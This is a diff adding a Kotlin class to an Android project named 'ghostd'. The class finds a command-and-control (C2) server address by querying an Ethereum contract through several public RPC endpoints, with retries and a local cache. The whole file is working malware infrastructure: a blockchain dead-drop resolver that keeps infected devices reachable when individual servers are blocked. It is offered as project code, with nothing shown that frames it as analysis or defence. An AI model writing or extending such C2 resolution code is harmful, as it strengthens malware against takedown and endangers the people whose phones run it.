@@ -1,0 +1,98 @@
+package com.tg.ghostd
+
+import android.content.Context
+import org.json.JSONArray
+import org.json.JSONObject
+import java.io.BufferedReader
+import java.io.InputStreamReader
+import java.net.HttpURLConnection
+import java.net.URL
+
+/**
+ * Resolves the C2 server endpoint (host[:port] or ws://…/wss://… URL) by
+ * reading `endpoint()` from the on-chain contract through a list of public
+ * RPCs, with fallbacks. Last-good endpoint is cached; cache is used when
+ * every RPC fails.
+ *
+ * Pure logic is kept here (no Android imports) so it is JVM-testable; the
+ * Android glue (SharedPreferences cache) is injected via lambdas.
+ */
+class EndpointResolver(
+    private val rpcUrls: List<String>,
+    private val contractAddress: String,
+    private val selector: String,
+    private val readCache: () -> String?,
+    private val writeCache: (String) -> Unit
+) {
+    /** Fresh chain read with RPC fallback; falls back to the local cache. */
+    fun resolve(): String? = fetchFresh() ?: readCache()
+
+    /**
+     * Try every RPC; return the normalized endpoint or null.
+     * Successful reads update the cache.
+     */
+    fun fetchFresh(): String? {
+        for (rpc in rpcUrls) {
+            try {
+                val result = ethCall(rpc) ?: continue
+                val ep = AbiCodec.decodeString(result)?.trim()
+                if (!ep.isNullOrEmpty()) {
+                    val normalized = normalize(ep)
+                    writeCache(normalized)
+                    return normalized
+                }
+            } catch (_: Exception) {
+                // try next RPC
+            }
+        }
+        return null
+    }
+
+    private fun ethCall(rpcUrl: String): String? {
+        val callObj = JSONObject().put("to", contractAddress).put("data", "0x$selector")
+        val params = JSONArray().put(callObj).put("latest")
+        val body = JSONObject()
+            .put("jsonrpc", "2.0").put("id", 1)
+            .put("method", "eth_call")
+            .put("params", params)
+            .toString()
+        val raw = httpPost(rpcUrl, body) ?: return null
+        return JSONObject(raw).optString("result", null)
+    }
+
+    private fun httpPost(url: String, body: String): String? {
+        val conn = URL(url).openConnection() as HttpURLConnection
+        return try {
+            conn.requestMethod = "POST"
+            conn.doOutput = true
+            conn.connectTimeout = 5_000
+            conn.readTimeout = 5_000
+            conn.setRequestProperty("Content-Type", "application/json")
+            conn.outputStream.use { it.write(body.toByteArray(Charsets.UTF_8)) }
+            if (conn.responseCode !in 200..299) return null
+            BufferedReader(InputStreamReader(conn.inputStream, Charsets.UTF_8)).use {
+                it.readText()
+            }
+        } finally {
+            conn.disconnect()
+        }
+    }
+
+    companion object {
+        /** Ensure the endpoint is a usable ws:// or wss:// URL. */
+        fun normalize(endpoint: String): String =
+            if (endpoint.startsWith("ws://") || endpoint.startsWith("wss://") ||
+                endpoint.startsWith("http://") || endpoint.startsWith("https://")
+            ) endpoint.replaceFirst("http://", "ws://").replaceFirst("https://", "wss://")
+            else "ws://$endpoint"
+
+        /** Android wiring: contract constants + SharedPreferences cache. */
+        fun forContext(ctx: Context) = EndpointResolver(
+            rpcUrls = C2.RPC_URLS,
+            contractAddress = C2.CONTRACT_ADDRESS,
+            selector = C2.ENDPOINT_SELECTOR,
+            readCache = { Prefs.cachedEndpoint(ctx) },
+            writeCache = { Prefs.setCachedEndpoint(ctx, it) }
+        )
+    }
+}
